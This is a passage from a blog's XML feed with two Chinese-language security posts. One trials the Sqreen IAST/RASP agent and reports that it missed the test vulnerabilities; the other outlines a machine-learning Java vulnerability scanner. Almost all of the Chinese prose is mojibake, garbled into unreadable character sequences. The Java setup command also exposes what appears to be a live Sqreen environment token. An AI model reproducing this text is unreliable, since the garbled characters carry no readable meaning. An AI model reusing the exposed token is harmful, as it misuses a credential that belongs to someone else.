alt="image-20200604191023036"></p><p>æ¥ç€å¯ä»¥é€‰æ‹©å¯¹å­—æ®µçš„åŒ¹é…è§„åˆ™</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191224862.png" alt="image-20200604191224862"></p><p>å…¶ä¸­hasSQLinjectionå’ŒhasXSSinjectionè¿™ä¸¤ä¸ªå®é™…ä¸Šæ˜¯é¢„å®šä¹‰çš„æ­£åˆ™ï¼Œç±»ä¼¼ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604192113549.png" alt="image-20200604192113549"></p><p>ä¸‹å›¾å¯ä»¥çœ‹å‡º<strong>In-App WAFä¸å¤–éƒ¨WAFçš„åŒºåˆ«</strong>ï¼Œå³ä¸æœ¬åº”ç”¨æ— å…³çš„å…¶ä»–æŠ€æœ¯è¢«Disabledï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191940016.png" alt="image-20200604191940016"></p><h2 id="RASP-Runtime-Application-Self-Protection"><a href="#RASP-Runtime-Application-Self-Protection" class="headerlink" title="RASP(Runtime Application Self-Protection)"></a>RASP(Runtime Application Self-Protection)</h2><p>RASPæ˜¯å­˜åœ¨å¾ˆä¹…çš„æ¦‚å¿µäº†ï¼ˆç›®å‰è¿˜æ²¡æ·±å…¥å­¦ä¹ ï¼ŒåæœŸä¼šè¡¥ä¸ŠæŠ€æœ¯åŸç†ï¼‰ï¼Œè¿™é‡Œç³»ç»Ÿæ”¯æŒä»¥ä¸‹æ¼æ´çš„é˜²å¾¡ï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604171427705.png" alt="image-20200604171427705"></p><h2 id="In-App-WAF-v-s-RASP"><a href="#In-App-WAF-v-s-RASP" class="headerlink" title="In-App WAF v.s. RASP"></a>In-App WAF v.s. RASP</h2><p>ä»æŠ€æœ¯åŸç†ä¸Šå¯ä»¥çœ‹åˆ°ä¸¤è€…çš„åŒºåˆ«ï¼ŒIn-App WAFæœ¬è´¨è¿˜æ˜¯WAFï¼Œé€šè¿‡æ­£åˆ™è§„åˆ™åŒ¹é…æ‹¦æˆªæ¶æ„æµé‡ï¼Œè€ŒRASPåˆ™æ˜¯hookäº†å…³é”®apiï¼Œé€šè¿‡åŠ¨æ€æ±¡ç‚¹åˆ†æç­‰æ–¹å¼å®ç°é«˜ç²¾åº¦çš„é˜²å¾¡ã€‚</p><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><ol><li><p>ç”³è¯·é€‚ç”¨åï¼Œç‚¹å‡»â€œConnect a new applicationâ€ï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604164240814.png" alt="image-20200604164240814"></p></li><li><p>è¿›å…¥éƒ¨ç½²å¼•å¯¼ç•Œé¢ï¼Œé€‰æ‹©è¯­è¨€å’Œé¡¹ç›®åç§°ï¼Œç‚¹å‡»â€œshow instructionsâ€åå¯ä»¥çœ‹åˆ°éƒ¨ç½²çš„java agentï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604164525671.png" alt="image-20200604164525671"></p><p>æŒ‰å³ä¾§æŒ‡ç¤ºæ“ä½œå³å¯ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°å¯¹äºjavaæ˜¯ä½¿ç”¨javaagentå®ç°çš„ï¼Œä¼°è®¡æ˜¯hookäº†ä¸€äº›å‡½æ•°ã€‚</p></li><li><p>å¯¹äºJavaé¡¹ç›®ï¼Œä¸‹è½½agentï¼Œå¹¶åŠ å‚æ•°é‡å¯åº”ç”¨ï¼ˆäº§å“ä¸Šçº¿æ—¶å¯ä»¥ç”¨SDKé›†æˆçš„æ–¹æ¡ˆï¼Œè¯¦æƒ…è§<a href="https://docs.sqreen.com/java/user-monitoring/" target="_blank" rel="noopener">https://docs.sqreen.com/java/user-monitoring/</a>ï¼‰ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://download.sqreen.com/java/sqreen.jar -o sqreen.jar</span><br><span class="line">java -javaagent:sqreen.jar -Dsqreen.token=env_org_dd05c0b8eb3317bbbc7857420ec86abe2ea5aa347ffc6c3efc8ef060 -Dsqreen.app_name=JavaDemo -jar java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure></li></ol><pre><code>å¯ä»¥çœ‹åˆ°Webé¡µé¢æœ€ä¸‹é¢ï¼Œæœ‰åº”ç”¨ä¸Šçº¿äº†ï¼š![image-20200604170231764](iast-Sqreenåˆæ¢/image-20200604170231764.png)</code></pre><h1 id="è¯•ç”¨ç»“æœ"><a href="#è¯•ç”¨ç»“æœ" class="headerlink" title="è¯•ç”¨ç»“æœ"></a>è¯•ç”¨ç»“æœ</h1><p>Javaæ–¹é¢å°è¯•äº†ä¸€ä¸‹<a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">JavaSecCode</a>ï¼Œåå°„å‹/å­˜å‚¨å‹XSSã€SQLiã€å‘½ä»¤æ³¨å…¥ã€XXEéƒ½æ²¡èƒ½æ£€æµ‹åˆ°ï¼Œä¼°è®¡æ˜¯WAFé‚£è¾¹ä¼°è®¡æ˜¯è§„åˆ™é—®é¢˜ï¼ŒRASPå› ä¸ºæ–‡æ¡£é‡Œæ²¡æœ‰ä»‹ç»å…·ä½“åŸç†ï¼Œä¸å¥½ç»™å‡ºè§£é‡Šã€‚</p><p>Nodejsæ–¹é¢åŸæœ¬æƒ³å°è¯•ç”¨<a href="https://github.com/Anemone95/NodeSecCode" target="_blank" rel="noopener">NodeSecCode</a>è¯•ä¸€ä¸‹çš„ï¼Œä½†æ˜¯æµ‹è¯•å‘ç°Sqreenå¹¶ä¸æ”¯æŒeggæ¡†æ¶ï¼Œåœ¨app.jsåŠ å…¥requireåä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">It seems that the following modules have been required before Sqreen:</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/debug/src/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/graceful-process/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg-logger/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg/index.js</span><br><span class="line">Sqreen may not be able to protect the whole application.</span><br><span class="line">If you think this is an error, please report it to Sqreen team.</span><br><span class="line">Read more on https://doc.sqreen.io/docs/nodejs-agent-installation</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ‰‹å†™ä¸€ç®€å•çš„expressæœåŠ¡ï¼Œå«ä¸€ä¸ªåå°„xssä»£ç ï¼ŒSqreenAgentå¯ä»¥æˆåŠŸéƒ¨ç½²ï¼Œä½†æ˜¯ä»æ²¡æœ‰å‘ç°è¯¥æ¼æ´ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Sqreen ä¸»è¦åˆ©ç”¨åŠ¨æ€æ’æ¡©æŠ€æœ¯å®ç°äº†IASTï¼Œä½†æ˜¯å®é™…æµ‹è¯•æ¥çœ‹æ•ˆæœå¹¶ä¸æ˜¯å¾ˆå¥½ï¼ˆä¸è®ºJavaè¿˜æ˜¯Nodejséƒ½æ²¡æœ‰å‘ç°æ¼æ´ï¼‰ï¼Œå®˜æ–¹æ¨èæ˜¯é…åˆ<a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a>è¿›è¡Œæ‰«æï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬äº§å“ç”±äºè§„åˆ™å’Œè®¾è®¡ç­‰åŸå› ï¼Œè¿˜æ˜¯éœ€è¦ç»“åˆä¼ ç»Ÿé»‘ç›’æ‰«æçš„çˆ¬è™«æˆ–Payloadæ‰èƒ½æœ‰æ•ˆæœã€‚</p><h1 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h1><ul><li><p>Sqreenå®˜æ–¹æ–‡æ¡£ï¼Œ<a href="https://docs.sqreen.com/" target="_blank" rel="noopener">https://docs.sqreen.com/</a></p></li><li><p>Sqreen GitHubï¼Œ<a href="https://github.com/sqreen" target="_blank" rel="noopener">https://github.com/sqreen</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.sqreen.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sqreen&lt;/a&gt; ä½œä¸ºä¸€æ¬¾IASTäº§å“ï¼Œç”¨æˆ·åœ¨é¡¹ç›®ä¸­å¯¼å…¥ä»–ä»¬çš„agentï¼Œä¹‹åå¯åœ¨æ§åˆ¶å°æŸ¥çœ‹æ£€æµ‹åˆ°çš„å®‰å…¨é£é™©ï¼Œå¹¶è¿›è¡Œé˜²å¾¡ï¼ˆRASPï¼‰ã€‚&lt;/p&gt;&lt;h1 id=&quot;æŠ€æœ¯ä»‹ç»&quot;&gt;&lt;a href=&quot;#æŠ€æœ¯ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;æŠ€æœ¯ä»‹ç»&quot;&gt;&lt;/a&gt;æŠ€æœ¯ä»‹ç»&lt;/h1&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒSqreenä¸»è¦ç”±ä¸‰ä¸ªç»„ä»¶ç»„æˆï¼ŒMicroAgentã€Security Engineå’ŒSqreen Platformï¼ŒSecurity Engineéƒ¨ç½²äºMicroAgentå†…éƒ¨ï¼Œå¼€å‘è€…åªè¦åœ¨å¯åŠ¨åº”ç”¨æ—¶å€’å…¥MicroAgentå³å¯ï¼ŒPlatformä¸»è¦ç”¨äºæ¥æ”¶Agentä¿¡æ¯å¹¶ä¸”å¯è§†åŒ–ç»™ç”¨æˆ·ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>æ¯•è®¾ï¼šåŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ</title>
    <link href="http://anemone.top/whitebox-%E6%AF%95%E8%AE%BE%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84Java%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F/"/>
    <id>http://anemone.top/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/</id>
    <published>2020-05-28T12:30:49.000Z</published>
    <updated>2020-05-28T11:45:51.032Z</updated>
    
    <content type="html"><![CDATA[<p><strong>æœ¬æ–‡é¦–æ¬¡å‘è¡¨åœ¨<a href="https://www.toutiao.com/i6826913540683596300/" target="_blank" rel="noopener">æ…•æµ‹å¤´æ¡å…¬ä¼—å·</a>ï¼Œè¿™é‡Œåªä½œå½’æ¡£ç”¨</strong></p><h1 id="èƒŒæ™¯æ„ä¹‰"><a href="#èƒŒæ™¯æ„ä¹‰" class="headerlink" title="èƒŒæ™¯æ„ä¹‰"></a>èƒŒæ™¯æ„ä¹‰</h1><p>éšç€äººä»¬å¯¹è½¯ä»¶å®‰å…¨çš„ä¸æ–­é‡è§†ï¼Œé™æ€å®‰å…¨æ‰«æç³»ç»Ÿè¢«éƒ¨ç½²äºå¼€å‘æµç¨‹ã€‚ç›¸å¯¹äºå…¶ä»–ä¼ ç»Ÿåˆ†ææ–¹æ³•ï¼Œæ±¡ç‚¹åˆ†ææŠ€æœ¯ç”±äºå…·æœ‰è¾ƒé«˜çš„å¯è§£é‡Šæ€§å’Œå‡†ç¡®æ€§ï¼Œç›®å‰ä½œä¸ºæŒ–æ˜ Web æ¼æ´çš„å¸¸ç”¨æŠ€æœ¯ï¼Œå¹¿æ³›åº”ç”¨äºå¼€æºå’Œå•†ç”¨æ‰«æå™¨ä¸­ã€‚</p><p>ç„¶è€Œï¼Œæ±¡ç‚¹åˆ†ææ–¹æ³•å­˜åœ¨ç§ç§ä¸è¶³ã€‚é¦–å…ˆï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†å®¹å™¨ç±»å‹ï¼Œé™æ€æ±¡ç‚¹åˆ†æåªèƒ½å°†å®¹å™¨å˜é‡ï¼ˆå¦‚Mapã€Listå˜é‡ï¼‰çš„ä¼ æ’­è§„åˆ™è®¾ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼›å…¶æ¬¡ï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†æ§åˆ¶æµï¼Œæ±¡ç‚¹åˆ†æå¹¶ä¸èƒ½è¯†åˆ«ç”¨äºæ£€æŸ¥æ•°æ®æ˜¯å¦åˆæ³•çš„åˆ†æ”¯è¯­å¥ï¼Œå¯¼è‡´è¯¯æŠ¥ï¼›æœ€åï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†ç‰¹æ®Šçš„ä¼ æ’­æ¡ä»¶ï¼Œå¦‚SSRFæ¼æ´è¦æ±‚æ”»å‡»è€…èƒ½æ“çºµåŸŸåï¼Œè‹¥æ±¡ç‚¹æ‹¼æ¥åœ¨URLå‚æ•°éƒ¨åˆ†ï¼Œåˆ™ä»£ç ä¸å­˜åœ¨æ¼æ´ï¼Œè€Œæ±¡ç‚¹åˆ†æä»ä¼šæŠ¥å‘Šæ¼æ´ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç›®å‰å®‰å…¨å·¥ç¨‹å¸ˆåªæœ‰æ‰‹åŠ¨è®¾è®¡ç²¾å·§çš„è§„åˆ™ï¼Œå¯å³ä½¿è¿™æ ·ä»ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ç”šè‡³æ¼æŠ¥ã€‚</p><a id="more"></a><p>ä¸ºè§£å†³ä¼ ç»Ÿåˆ†ææ–¹æ³•é«˜è¯¯æŠ¥ã€éœ€è¦èŠ±å¤§é‡äººåŠ›å®šä¹‰è§„åˆ™ç­‰é—®é¢˜ï¼Œéšç€æœºå™¨å­¦ä¹ é¢†åŸŸçš„ä¸æ–­å‘å±•ï¼Œå­¦æœ¯ç•Œä¸€ç›´åœ¨æ¢ç´¢æœºå™¨å­¦ä¹ åœ¨é™æ€å®‰å…¨æ‰«æä¸Šçš„åº”ç”¨ã€‚æçç­‰å­¦è€…ä½¿ç”¨åå‘ç¨‹åºåˆ‡ç‰‡ç»“åˆBLSTMç¥ç»ç½‘ç»œè¿›è¡Œæ¼æ´æŒ–æ˜[1]ï¼Œç„¶è€Œä»–ä»¬çš„å·¥å…·åªèƒ½ç”¨äºC/C++ç¼–å†™çš„è½¯ä»¶ï¼ŒKoc ç­‰å­¦è€…æå‡ºä½¿ç”¨ç±»ä¼¼æŠ€æœ¯å¯¹Javaä»£ç æ¼æ´è¿›è¡Œè¿‡æ»¤[2,3]ï¼Œé€šè¿‡é¢„æµ‹è¯¯æŠ¥æé«˜æ‰«æç»“æœå‡†ç¡®æ€§ï¼Œå®éªŒè¯æ˜è¯¥å·¥å…·å…·æœ‰å¾ˆå¥½çš„æ•ˆæœï¼Œç„¶è€Œç”±äºä¼ ç»Ÿç¨‹åºåˆ‡ç‰‡è¿‡äºè€—æ—¶ï¼Œå…¶å·¥ä½œåªèƒ½å¯¹æ±¡ç‚¹ä¼ æ’­çš„æœ€åä¸€æ®µå‡½æ•°ä½“è¿›è¡Œåˆ‡ç‰‡ï¼Œæ±¡ç‚¹ä¼ æ’­æ˜¯å¦èƒ½å¤Ÿä¼ æ’­å¹¶ä¸ç­‰ä»·äºæ±¡ç‚¹æ˜¯å¦èƒ½å¤Ÿåœ¨æ±‡èšç‚¹ä¼ æ’­ï¼Œå› æ­¤ä»–ä»¬çš„å·¥ä½œæ— æ³•ç”¨äºå®é™…åœºæ™¯ã€‚</p><p>å¯è§ï¼Œä¸€æ¬¾å®é™…å¯ç”¨çš„åŸºäºæœºå™¨å­¦ä¹ çš„Javaé™æ€æ¼æ´æ‰«æç³»ç»Ÿèƒ½æœ‰æ•ˆå‡è½»å·¥ç¨‹å¸ˆå·¥ä½œé‡ï¼Œåœ¨å¿«é€Ÿå¼€å‘è½¯ä»¶çš„åŒæ—¶ä¿è¯è½¯ä»¶å®‰å…¨æ€§ã€‚</p><h1 id="ç³»ç»Ÿä»‹ç»"><a href="#ç³»ç»Ÿä»‹ç»" class="headerlink" title="ç³»ç»Ÿä»‹ç»"></a>ç³»ç»Ÿä»‹ç»</h1><p>æœ¬ç³»ç»Ÿç»“åˆæœ€æ–°å­¦æœ¯ç•Œæˆæœï¼Œé¢å‘ Web å¼€å‘å¸¸ç”¨çš„ Java è¯­è¨€ï¼Œåˆ©ç”¨æ±¡ç‚¹åˆ†æã€ç¨‹åºåˆ‡ç‰‡å’Œ BLSTM ä¸ºå¼€å‘æˆ–å®‰å…¨å·¥ç¨‹å¸ˆæä¾›æ›´å‡†ç¡®çš„ä»£ç æ‰«ææœåŠ¡ã€‚å…¶å·¥ä½œæµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¥ç¨‹å¸ˆåœ¨ç³»ç»Ÿä¸­æ–°å»ºæ‰«æé¡¹ç›®ï¼Œåœ¨é¡¹ç›®ä¸­æäº¤æºä»£ç å’ŒJaråŒ…ï¼›æ±¡ç‚¹åˆ†ææ¨¡å—å¯¹ Jar åŒ…è¿›è¡Œæ±¡ç‚¹åˆ†æï¼Œå¾—åˆ°æ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šï¼Œæ±¡ç‚¹æŠ¥å‘Šä¸­åŒ…å«æœ‰æ¼æ´å®ä¾‹å’Œå¯¹åº”çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼›ç¨‹åºåˆ‡ç‰‡æ¨¡å—å°†å¯¹ä¼ æ’­æ ‘åˆ†è§£ä¸ºæ±¡æŸ“æµï¼Œå¹¶å¯¹æ¯ä¸€æ±¡æŸ“æµè¿›è¡Œåˆ‡ç‰‡ï¼›æ•°æ®é¢„å¤„ç†æ¨¡å—å¯¹åˆ‡ç‰‡è¿›è¡Œæ³›åŒ–å’Œå‘é‡åŒ–å¤„ç†ï¼Œå¾—åˆ°åˆ‡ç‰‡çš„ç‰¹å¾å‘é‡ï¼›é¢„æµ‹æ¨¡å—é€šè¿‡BLSTMæ¨¡å‹å¯¹åˆ‡ç‰‡è¿›è¡Œé¢„æµ‹ï¼Œä»è€Œæ¨å¯¼æ¼æ´æ˜¯å¦ä¸ºè¯¯æŠ¥ï¼›è‡³æ­¤ï¼Œç³»ç»Ÿå°†æ›´ç²¾å‡†çš„æ¼æ´æŠ¥å‘Šè¿”å›è‡³ç”¨æˆ·ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/overview169-1590658589087.png" alt="overview169"></p><p>åœ¨æ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹FindSecBugsçš„æ±¡ç‚¹åˆ†æè¿‡ç¨‹è¿›è¡Œæ”¹é€ ï¼Œä½¿å…¶åœ¨æŠ¥å‘Šä¸­è¿”å›æ±¡ç‚¹ä¼ æ’­æ ‘ï¼Œæ±¡ç‚¹ä¼ æ’­æ ‘è¡¨ç¤ºæ±¡ç‚¹çš„å”¯ä¸€ä¼ æ’­è·¯å¾„ï¼Œä¸ºç¨‹åºåˆ‡ç‰‡æä¾›ä¾æ®ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä»£ç  1 æ¥è¯´ï¼Œåœ¨æ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šä¸­è¿”å›å¦‚å›¾ 1æ‰€ç¤ºçš„ä¼ æ’­æ ‘ï¼Œå¯è§ä¼ æ’­æ ‘çš„æ ‘æ ¹ä¸ºæ±¡ç‚¹å…¥å£å‡½æ•°ä¸Šä¸‹æ–‡ï¼Œå¶å­èŠ‚ç‚¹ä¸ºå‡½æ•°è°ƒç”¨æˆ–è¿”å›è¯­å¥ï¼Œä¸”å¶å­èŠ‚ç‚¹å­˜åœ¨é¡ºåºï¼Œä¸”ç»ˆæ­¢äºæ±‡èšç‚¹ï¼Œæ³¨æ„å°½ç®¡ä»£ç ä¸­å­˜åœ¨ifåˆ†æ”¯ï¼Œä½†æœ‰çš„åˆ†æ”¯è¿”å›è¯­å¥ä¸æ±¡ç‚¹æ— å…³ï¼Œå› æ­¤æœ€ç»ˆåªæœ‰ä¸€ä¸ªæ±¡ç‚¹ä¼ æ’­æ ‘ã€‚</p><p>åœ¨ç¨‹åºåˆ‡ç‰‡è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹æ±¡ç‚¹åˆ†ææŠ¥å‘Šä¸­çš„æ¼æ´å®ä¾‹è¿›è¡Œåˆ‡ç‰‡ï¼Œä¸ºè§£å†³åˆ‡ç‰‡è§„æ¨¡å·¨å¤§é€ æˆæ‰«ææ—¶é—´è¿‡é•¿ç”šè‡³æ‰«æå¤±è´¥çš„é—®é¢˜ï¼Œåœ¨åˆ‡ç‰‡å‰ï¼Œç³»ç»Ÿé€šè¿‡é™åˆ¶è°ƒç”¨å›¾èŠ‚ç‚¹ä¸ªæ•°ä¿è¯åˆ‡ç‰‡å¿«é€Ÿå®Œæˆï¼›åŒæ—¶ï¼Œä¸ºä¿è¯åˆ‡ç‰‡è¦†ç›–æ±¡ç‚¹ä¼ æ’­å…¨é˜¶æ®µï¼Œç³»ç»Ÿå¯¹ä¸€ä¸ªæ¼æ´è¿›è¡Œåˆ†æ®µåˆ‡ç‰‡ï¼Œå¯¹äºä¸€ä¸ªæ¼æ´çš„æ¯ä¸€ä¼ æ’­æ ‘ï¼Œå°†å…¶æ‹†è§£ä¸ºæ±¡ç‚¹ä¼ æ’­ç‰‡æ®µï¼Œç”±â€œå‡½æ•°æ‘˜è¦â†’å…´è¶£ç‚¹è¡Œå·â€äºŒå…ƒç»„è¡¨ç¤ºï¼Œå†å¯¹æ¯ä¸ªç‰‡æ®µè¿›è¡Œåˆ‡ç‰‡ï¼Œä¾‹å¦‚å›¾ 1 çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼Œå°†ä¼šäº§ç”Ÿ<strong>doGet()â†’line:5</strong>ã€<strong>filter()â†’line:13</strong>å’Œ<strong>sink()â†’line:17</strong> 3ä¸ªåˆ‡ç‰‡ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/ä»£ç 1å’Œå›¾1.png" alt="ä»£ç 1å’Œå›¾1"></p><p>åœ¨é¢„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹æ¯ä¸€åˆ‡ç‰‡è¿›è¡Œæ³›åŒ–å’Œå‘é‡åŒ–å¤„ç†ï¼Œå›¾ 4 å°†è¯´æ˜æ³›åŒ–è¿‡ç¨‹ï¼Œå›¾ä¸­å·¦ä¾§ä¸ºåŸå§‹åˆ‡ç‰‡è¾“å‡ºï¼Œå…¶æ¯è¡Œä»£è¡¨ä¸€ä¸ªSDGèŠ‚ç‚¹ï¼ŒSDGèŠ‚ç‚¹ç”±â€œåºå·ï¼šï¼šèŠ‚ç‚¹ç±»å‹ï¼šï¼šæŒ‡ä»¤ç±»å‹ï¼šï¼šè¿”å›å€¼ï¼šï¼šå…·ä½“å†…å®¹â€æ„æˆï¼Œé¢„å¤„ç†è¿‡ç¨‹ä¿ç•™èŠ‚ç‚¹ç±»å‹ã€æŒ‡ä»¤ç±»å‹å’Œå…·ä½“å†…å®¹ï¼Œå¹¶å¯¹åˆ‡ç‰‡ä¸­æ•°å­—å¸¸é‡ã€å­—ç¬¦ä¸²å¸¸é‡ã€å˜é‡ã€å‡½æ•°è°ƒç”¨å’Œç±»åæ–¹æ³•åè¿›è¡ŒæŠ½è±¡ï¼Œç»è¿‡æ³›åŒ–ååˆ‡ç‰‡å¦‚å³ä¾§æ‰€ç¤ºã€‚å‘é‡åŒ–è¿‡ç¨‹å°†æ³›åŒ–åçš„å•è¯åºåˆ—è½¬åŒ–ä¸ºæ•°å­—å‘é‡ï¼Œç”¨äºä¼ å…¥ç¥ç»ç½‘ç»œã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/image-20200528173120092.png" alt="image-20200528173120092"></p><p>åœ¨è¯¯æŠ¥é¢„æµ‹è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿé¦–å…ˆé€šè¿‡BLSTMç¥ç»ç½‘ç»œé¢„æµ‹æ¯ä¸€æ±¡ç‚¹ä¼ æ’­ç‰‡æ®µæ˜¯å¦å¯ä»¥ä¼ æ’­æ±¡ç‚¹ï¼Œå†é€šè¿‡æ±¡ç‚¹ä¼ æ’­è§„åˆ™æ¨å¯¼æ¼æ´æ˜¯å¦ä¸ºè¯¯æŠ¥ï¼Œå³ï¼šè‹¥ä¼ æ’­æ ‘ä¸­å›½ä»»æ„ä¸€ä¸ªé˜¶æ®µä¸èƒ½ä¼ æ’­æ±¡ç‚¹ï¼Œé‚£ä¹ˆè¯¥ä¼ æ’­æ ‘æ— æ³•åˆ©ç”¨ï¼›è‹¥æ¼æ´ä¸­æ‰€æœ‰ä¼ æ’­æ ‘æ— æ³•åˆ©ç”¨ï¼Œé‚£ä¹ˆæ ‡è®°è¯¥æ¼æ´ä¸ºè¯¯æŠ¥ã€‚ä¾‹å¦‚ä»£ç  1 ä¸­ï¼Œé¦–å…ˆBLSTMæ¨¡å‹å¾ˆå¯èƒ½é¢„æµ‹åˆ°<strong>filter()â†’line:13</strong> åˆ‡ç‰‡æ— æ³•ä¼ æ’­æ±¡ç‚¹ï¼Œå› æ­¤å¯¹åº”çš„æ±¡ç‚¹ä¼ æ’­æ ‘ä¸å¯åˆ©ç”¨ï¼Œåˆå› ä¸ºæ¼æ´åªæœ‰ä¸€ä¸ªä¼ æ’­æ ‘ï¼Œå› æ­¤ç³»ç»Ÿåˆ¤æ–­æ¼æ´ä¸ºè¯¯æŠ¥ã€‚</p><p>ä¸‹å›¾å±•ç¤ºäº†ç³»ç»Ÿä¸­ä»£ç  1çš„é¢„æµ‹ç»“æœï¼Œè¯¥å®ä¾‹çš„èŠ‚ç‚¹å·²ç»å˜ç°ï¼Œä¸”é¢„æµ‹æ˜¾ç¤ºä¸ºâ€œ[P:FP]â€ï¼ˆè¯¯æŠ¥ï¼‰ï¼Œå·¦ä¸‹æ–¹è¢«é¢„æµ‹ä¸ºæ¸…æ´å‡½æ•°å·²ç”±æ¸…æ´æ ‡è®°æ ‡æ³¨ï¼Œè¿™äº›æ ‡è®°å‘ç”¨æˆ·è§£é‡Šç³»ç»Ÿä¸ºä½•å°†å…¶é¢„æµ‹ä¸ºè¯¯æŠ¥ï¼Œè¿™è¯´æ˜æœ¬ç³»ç»Ÿæ˜¯çœŸå®æœ‰æ•ˆçš„ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/å›¾3.png" alt="å›¾3"></p><p>å¯¹äºæ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šï¼Œç”¨æˆ·å¯ä»¥æ ‡è®°ä¸ºæ­£æŠ¥æˆ–è¯¯æŠ¥ã€‚å¯¹äºæ­£æŠ¥ï¼Œç”¨æˆ·éœ€è‡³å°‘æŒ‡å®šä¸€ä¸ªå¯åˆ©ç”¨çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼›å¯¹äºè¯¯æŠ¥ï¼Œç”¨æˆ·éœ€æŒ‡å®šè‹¥å¹²æ¡æ±¡ç‚¹æ— æ³•ä¼ æ’­çš„ç‰‡æ®µï¼Œç›´åˆ°ç³»ç»Ÿæ ¹æ®æ±¡ç‚¹ä¼ æ’­è§„åˆ™å°†å…¶æ¨å¯¼ä¸ºè¯¯æŠ¥ã€‚</p><h1 id="é¡¹ç›®æ•ˆç›Š"><a href="#é¡¹ç›®æ•ˆç›Š" class="headerlink" title="é¡¹ç›®æ•ˆç›Š"></a>é¡¹ç›®æ•ˆç›Š</h1><p>ä¸ºè¯æ˜ç³»ç»Ÿå‡†ç¡®æ€§ï¼Œæœ¬æ–‡å°†æœ¬ç³»ç»Ÿä¸ç›®å‰æµè¡Œçš„æ‰«æå·¥å…· FindSecBugs å¯¹æ¯”ï¼Œä»¥OWASP Benchmark v1.1ä¸­æ±¡ç‚¹ä¼ æ’­ç±»æ¼æ´ä½œä¸ºæ•°æ®é›†ï¼Œæ¯”è¾ƒä¸¤è€…çš„å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰ã€ç²¾ç¡®ç‡ï¼ˆPrecisionï¼‰ã€å¬å›ç‡ï¼ˆRecallï¼‰å’Œ F1ã€‚</p><p><img 